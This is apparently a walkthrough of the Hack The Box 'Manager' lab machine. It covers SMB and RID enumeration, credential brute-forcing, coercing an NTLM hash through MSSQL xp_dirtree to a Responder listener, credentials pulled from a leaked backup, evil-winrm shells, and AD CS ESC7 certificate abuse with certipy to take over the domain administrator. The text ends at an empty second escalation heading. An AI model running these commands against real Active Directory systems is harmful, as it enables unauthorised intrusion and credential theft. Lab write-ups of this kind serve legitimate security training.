# nmap
From the nmap results, we can see that we are enumerating an active directory environment as port 3269, 3268, 636 and 389 is open and the domain is called manager.htb0. From the results below, we are also able to find out that the DNS server is dc01.manager.htb and the certificate authority is manager-DC01-CA

```
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-11-04T00:54:39+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
...
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-11-04T00:54:39+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-11-04T00:54:40+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager

```

Apart from that, we are able to discover that port 1433 (mssql), port 445(SMB) and port 5985(winrm) are open

```
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
445/tcp   open  microsoft-ds? syn-ack
```
# fscan
Using fscan, we can see that we are enumerating an active directory environment and the hostname of the domain controller is called dc01

```
start vulscan
[*] WebTitle: http://10.10.11.236       code:200 len:18203  title:Manager
[*] NetInfo:
[*]10.10.11.236
   [->]dc01
   [->]10.10.11.236
```

# SMB Null Authentication
Next, we will try SMB null authentication to check if we can validate to the SMB service on the host. We found out that we can authenticate to the SMB host, but we do not have the permissions to access the services on the SMB host

```
┌──(kali㉿kali)-[~/Desktop/manager]
└─$ smbmap -u null -p "" -H 10.10.11.236 -P 445 2>&1
[+] Guest session       IP: 10.10.11.236:445    Name: manager.htb                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/manager]
└─$ smbclient "//10.10.11.236/IPC$" --option='client min protocol=NT1'
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> 
```

Since we know that we can do null authentication on SMB, let us bruteforce the users that can be found from the SMB host. First, let us use enum4linux to gather information regarding the linux host. However, we were unable to find much information regarding the users from the SMB host. (Note: The users that are being enumerated in this case belongs to the domain users and not the normal users)
- This is equivalent as the command ```crackmapexec smb 10.10.11.236 -u null -p "" --users``` (in terms of enumerating users)

We will then use crackmapexec to enumerate the domain users. Unfortunately, we are unable to enumerate domain users as the NTLM needs domain username and password

```
┌──(pentest)─(kali㉿kali)-[~/Desktop]
└─$ crackmapexec smb 10.10.11.236 -u null -p '' --users    
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\null: 
SMB         10.10.11.236    445    DC01             [-] Error enumerating domain users using dc ip 10.10.11.236: NTLM needs domain\username and a password
SMB         10.10.11.236    445    DC01             [*] Trying with SAMRPC protocol

```
Afterwards, we will use crackmapexec again to enumerate the rids 

```
┌──(pentest)─(kali㉿kali)-[~/Desktop]
└─$ crackmapexec smb 10.10.11.236 -u null -p '' --rid-brute
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\null: 
SMB         10.10.11.236    445    DC01             [+] Brute forcing RIDs
SMB         10.10.11.236    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.10.11.236    445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.10.11.236    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.10.11.236    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.10.11.236    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.236    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.10.11.236    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.236    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.10.11.236    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.10.11.236    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.10.11.236    445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.10.11.236    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.10.11.236    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.10.11.236    445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

From the output, we are able to obtain a potential list of users

```
Zhong
Cheng
Ryan
Raven
JinWoo
ChinHae
Operator
```

# Bruteforce logins
Now, we will use crackmapexec to attempt to bruteforcee a login on smb. We are able to find a valid set of credentials (Opertor:operator)

```
┌──(pentest)─(kali㉿kali)-[~/Desktop/manager]
└─$ crackmapexec smb 10.10.11.236 -u users.txt -p pass.txt
...
SMB         10.10.11.236    445    DC01             [-] manager.htb\Operator:chinHae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\Operator:operator 
```

However, using this set of credentials, we notice that the user only has read access but does not have write access at all. Hence, we will not be able to spawn a shell using ```impacket-smbexec``` using this set of credentials. 
```
┌──(pentest)─(kali㉿kali)-[~/Desktop/manager]
└─$ smbmap -u "Operator" -p "operator" -H 10.10.11.236 -P 445 2>&1
[+] IP: 10.10.11.236:445        Name: manager.htb                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
```

Next, we will use crackmapexec to bruteforce the same list of users for mssql. Again, we find that the same set of credentials is able to login to mssql

```
┌──(pentest)─(kali㉿kali)-[~/Desktop/manager]
└─$ crackmapexec mssql 10.10.11.236 -u users.txt -p pass.txt               
MSSQL       10.10.11.236    1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
...
MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\Operator:operator 
```

Using the set of credentials, we are able to login to the mssql server. However, we are unable to rce using the set of credentials as the user does not seem to have the required privileges

```
┌──(pentest)─(kali㉿kali)-[~/Desktop]
└─$ impacket-mssqlclient operator:operator@10.10.11.236 -windows-auth
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
SQL> sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC master..xp_cmdshell 'whoami
SQL> 
```

However, we notice that we can obtain the hash of the MANAGER user by setting up a responder on our local machine and sending the hash over via ```impacket-mssqlclient```. However, we are unable to crack the hashes that we have obtained.
```
┌──(pentest)─(kali㉿kali)-[~/Desktop/manager]
└─$ impacket-mssqlclient Operator@10.10.11.236 -debug -windows-auth
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /home/kali/Desktop/pentest/lib/python3.11/site-packages/impacket
Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> xp_dirtree '\\10.10.16.4\any\thing
SQL> exec master.dbo.xp_dirtree '\\10.10.16.4\any\thing'
subdirectory   depth   
------------   -----   
SQL> 

┌──(kali㉿kali)-[~]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)

.....
[+] Listening for events...                                                                                    

[SMB] NTLMv2-SSP Client   : 10.10.11.236
[SMB] NTLMv2-SSP Username : MANAGER\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::MANAGER:e892e05440e4a345:8C78EB8495936A9F6BBD54D7D8D40ADD:010100000000000000BE77F2C90EDA01BB6B4207E945FF00000000000200080047005A004300580001001E00570049004E002D004E00550031004C004F004F004C004F005A0036005A0004003400570049004E002D004E00550031004C004F004F004C004F005A0036005A002E0047005A00430058002E004C004F00430041004C000300140047005A00430058002E004C004F00430041004C000500140047005A00430058002E004C004F00430041004C000700080000BE77F2C90EDA01060004000200000008003000300000000000000000000000003000004B33387EDB15408E9E5D465080C90725E1B5497048FE80A8B2A75D7CF15F755F0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000  
```

However, since we are able to list the directory on the server, let us try to list the directories to find out suspicious files. From there, we can see that there are a few interesting files on the website such as "web.config" and "website-backup-27-07-23-old.zip"

```
SQL> xp_dirtree 'C:\inetpub\wwwroot',1,1;
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   
contact.html                          1      1   
css                                   1      0   
images                                1      0   
index.html                            1      1   
js                                    1      0   
service.html                          1      1   
web.config                            1      1   
website-backup-27-07-23-old.zip       1      1 
```

Browsing to http://manager.htb/website-backup-27-07-23-old.zip, we notice that we are able to download the zip file. Extracting the file, we find a ```.old-conf.xml``` file that contains DC credentials for raven.

```
┌──(kali㉿kali)-[~/Desktop/manager/website-backup-27-07-23-old]
└─$ ls -la
total 68
drwxr-xr-x 5 kali kali  4096 Nov  4 03:07 .
drwxr-xr-x 3 kali kali  4096 Nov  4 03:07 ..
-rw-r--r-- 1 kali kali  5386 Jul 27 05:32 about.html
-rw-r--r-- 1 kali kali  5317 Jul 27 05:32 contact.html
drwx------ 2 kali kali  4096 Nov  4 03:07 css
drwx------ 2 kali kali  4096 Nov  4 03:07 images
-rw-r--r-- 1 kali kali 18203 Jul 27 05:32 index.html
drwx------ 2 kali kali  4096 Nov  4 03:07 js
-rw-r--r-- 1 kali kali   698 Jul 27 05:35 .old-conf.xml
-rw-r--r-- 1 kali kali  7900 Jul 27 05:32 service.html
                                                                                                               
┌──(kali㉿kali)-[~/Desktop/manager/website-backup-27-07-23-old]
└─$ cat .old-conf.xml      
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

Using evil-winrm, we are able to authenticate to the winrm service as the user raven

```
┌──(kali㉿kali)-[~/Desktop/manager/website-backup-27-07-23-old]
└─$ evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Raven\Documents> whoami; hostname
manager\raven
dc01
*Evil-WinRM* PS C:\Users\Raven\Documents> 
```

# Obtaining user flag

```
*Evil-WinRM* PS C:\Users\Raven\Desktop> type C:\Users\Raven\Desktop\user.txt
<redacted user flag>
```

# Privilege Escalation #1: Certipy
Checking the permissions, we see that the user has ```SeMachineAccountPrivilege``` enabled.

```
*Evil-WinRM* PS C:\Users\Raven\Desktop> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Using ```certify```, we can find vulnerable templates from the domain controller

```
┌──(pentest)─(kali㉿kali)-[~/Desktop]
└─$ certipy find -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -vulnerable
Certipy v4.5.1 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Saved BloodHound data to '20231105010843_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20231105010843_Certipy.txt'
[*] Saved JSON output to '20231105010843_Certipy.json'

┌──(pentest)─(kali㉿kali)-[~/Desktop]
└─$ cat 20231105010843_Certipy.txt                                                     
Certificate Authorities
...
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates
```

Looking at the results, we can see that the raven user has the rights to enroll a new certificate and also, to manager certificate authorities. We can also see that it is vulnerable to ESC7. 
Using the tutorial from [here](https://github.com/ly4k/Certipy#esc7), we will have to first give Raven the "ManageCertificates" right by adding Raven as the new officer
```
┌──(pentest)─(kali㉿kali)-[~/Desktop]
└─$ certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
Certipy v4.5.1 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```
Now, if we run certipy again, we would see that the Raven user would have the ManageCertificates privilege

```
...
ManageCertificates: MANAGER.HTB\Administrators
                    MANAGER.HTB\Domain Admins
                    MANAGER.HTB\Enterprise Admins
                    MANAGER.HTB\Raven
...
```

Afterwards, we will have to enable the SubCA template on the Certificate Authority

```
┌──(pentest)─(kali㉿kali)-[~/Desktop]
└─$ certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
Certipy v4.5.1 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```

Afterwards, we will attempt to request the private key from the Certificate Authority. However, this request will fail but we will note down the request ID

```
┌──(pentest)─(kali㉿kali)-[~/Desktop]
└─$ certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -template SubCA -upn administrator@manager.htb
Certipy v4.5.1 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 14
Would you like to save the private key? (y/N) y
[*] Saved private key to 14.key
[-] Failed to request certificate
```

Afterwards, we will have to issue the certificate for the corresponding private key that we have requested using the Request ID

```
┌──(pentest)─(kali㉿kali)-[~/Desktop]
└─$ certipy ca -ca 'manager-DC01-CA' -issue-request 13 -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' 
Certipy v4.5.1 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

Lastly, we will have to retrieve the certificate for the administrator using certipy

```
┌──(pentest)─(kali㉿kali)-[~/Desktop]
└─$ certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -retrieve 14
Certipy v4.5.1 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 14
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '14.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

Since we have the pfx file, we will be able to retrieve the NT hash for the administrator user

```
┌──(pentest)─(kali㉿kali)-[~/Desktop]
└─$ certipy auth -pfx administrator.pfx
Certipy v4.5.1 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```
Using the hostname, we can then gain access as the Administrator user using evil-winrm

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.11.236 -u Administrator -H 'ae5064c2f62317332c88629e025924ef' 

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                       

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                         

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami; hostname
manager\administrator
dc01
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
# Obtaining root flag
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
<redacted root flag>
```
# Privilege Escalation #2: Certify
